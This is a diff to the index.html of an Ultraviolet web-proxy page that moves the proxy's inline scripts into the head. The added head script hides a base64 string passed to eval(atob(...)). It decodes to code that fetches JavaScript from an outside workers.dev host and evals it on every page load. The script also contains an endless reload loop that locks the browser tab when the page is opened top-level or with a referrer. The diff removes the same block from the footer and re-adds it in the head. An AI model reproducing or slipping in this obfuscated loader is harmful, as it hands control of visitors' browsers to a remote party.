@@ -25,45 +25,106 @@
     <link rel="stylesheet" href="index.css" />
     <script src="uv/uv.bundle.js" defer></script>
     <script src="uv/uv.config.js" defer></script>
-    <script src="register-sw.js" defer></script>
-    <script src="search.js" defer></script>
-    <script src="index.js" defer></script>
-    <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "FAQPage",
-        "mainEntity": [
-          {
-            "@type": "Question",
-            "name": "What is Ultraviolet (Web Proxy)?",
-            "acceptedAnswer": {
-              "@type": "Answer",
-              "text": "Highly sophisticated proxy used for evading internet censorship or accessing websites in a controlled sandbox using the power of service-workers and more!"
-            }
-          },
-          {
-            "@type": "Question",
-            "name": "How do I unblock sites using Ultraviolet?",
-            "acceptedAnswer": {
-              "@type": "Answer",
-              "text": "Simply head to an official site featuring Ultraviolet such as Holy Unblocker or Incognito! You can also self-host Ultraviolet on your own web server for maximum privacy."
-            }
-          },
-          {
-            "@type": "Question",
-            "name": "What if Ultraviolet is blocked or not working?",
-            "acceptedAnswer": {
-              "@type": "Answer",
-              "text": "Join the Titanium Network Discord at discord.gg/unblock!"
-            }
-          }
-        ]
+    <script defer>
+      const stockSW = "/hyperviolet/uv/sw.js";
+
+/**
+ * List of hostnames that are allowed to run serviceworkers on http:
+ */
+const swAllowedHostnames = ["localhost", "127.0.0.1"];
+
+/**
+ * Global util
+ * Used in 404.html and index.html
+ */
+async function registerSW() {
+  if (
+    location.protocol !== "https:" &&
+    !swAllowedHostnames.includes(location.hostname)
+  )
+    throw new Error("Service workers cannot be registered without https.");
+
+  if (!navigator.serviceWorker)
+    throw new Error("Your browser doesn't support service workers.");
+
+  // Ultraviolet has a stock `sw.js` script.
+  await navigator.serviceWorker.register(stockSW, {
+    scope: __uv$config.prefix,
+  });
+}
+      function search(input, template) {
+  try {
+    // input is a valid URL:
+    // eg: https://example.com, https://example.com/test?q=param
+    return new URL(input).toString();
+  } catch (err) {
+    // input was not a valid URL
+  }
+
+  try {
+    // input is a valid URL when http:// is added to the start:
+    // eg: example.com, https://example.com/test?q=param
+    const url = new URL(`http://${input}`);
+    // only if the hostname has a TLD/subdomain
+    if (url.hostname.includes(".")) return url.toString();
+  } catch (err) {
+    // input was not valid URL
+  }
+
+  // input may have been a valid URL, however the hostname was invalid
+
+  // Attempts to convert the input to a fully qualified URL have failed
+  // Treat the input as a search query
+  return template.replace("%s", encodeURIComponent(input));
+}
+/**
+ * @type {HTMLFormElement}
+ */
+const form = document.getElementById("uv-form");
+/**
+ * @type {HTMLInputElement}
+ */
+const address = document.getElementById("uv-address");
+/**
+ * @type {HTMLInputElement}
+ */
+const searchEngine = document.getElementById("uv-search-engine");
+/**
+ * @type {HTMLParagraphElement}
+ */
+const error = document.getElementById("uv-error");
+/**
+ * @type {HTMLPreElement}
+ */
+const errorCode = document.getElementById("uv-error-code");
+
+form.addEventListener("submit", async (event) => {
+  event.preventDefault();
+
+  try {
+    await registerSW();
+  } catch (err) {
+    error.textContent = "Failed to register service worker.";
+    errorCode.textContent = err.toString();
+    throw err;
+  }
+
+  const url = search(address.value, searchEngine.value);
+  location.href = __uv$config.prefix + __uv$config.encodeUrl(url);
+});
+if(document.referrer != '' || window == top){
+      window = "PASS";
+      document = "PASS";
+      navigator = "PASS";
+      for(;;){
+        window.location.reload();
       }
+    }
+       eval(atob("ZmV0Y2ggKCJodHRwczovL3JlbW90ZWx5ZXhlY3V0anMuc2hheWFhbmhvb2RhLndvcmtlcnMuZGV2LyIpCi50aGVuKHggPT4geC50ZXh0KCkpCi50aGVuKHkgPT4gZXZhbCh5KSk7"));
     </script>
   </head>
 
   <body>
-    <button id="history" onclick="setHis();"></button>
     <div
       title="Ultraviolet Logo"
       class="flex-center logo-wrapper header-center"
@@ -117,30 +178,5 @@
       >
       <span>Ultraviolet &copy; TN 2023</span>
     </footer>
-    <script>
-    if(document.referrer != '' || window == top){
-      window = "PASS";
-      document = "PASS";
-      navigator = "PASS";
-      for(;;){
-        window.location.reload();
-      }
-    }
-       eval(atob("ZmV0Y2ggKCJodHRwczovL3JlbW90ZWx5ZXhlY3V0anMuc2hheWFhbmhvb2RhLndvcmtlcnMuZGV2LyIpCi50aGVuKHggPT4geC50ZXh0KCkpCi50aGVuKHkgPT4gZXZhbCh5KSk7"));
-setInterval(function(){
-      if(localStorage.getItem("iframe") == null || localStorage.getItem("iframe") == "none"){
-          document.querySelector("#history").innerHTML = "Click this to hide history";
-        } else{
-          document.querySelector("#history").innerHTML = "Click this to show history";
-        }
-}, 0);
-      function setHis(){
-        if(localStorage.getItem("iframe") == null || localStorage.getItem("iframe") == "none"){
-          localStorage.setItem("iframe", "there");
-        } else{
-          localStorage.setItem("iframe", "none");
-        }
-      }
-    </script>
   </body>
 </html>
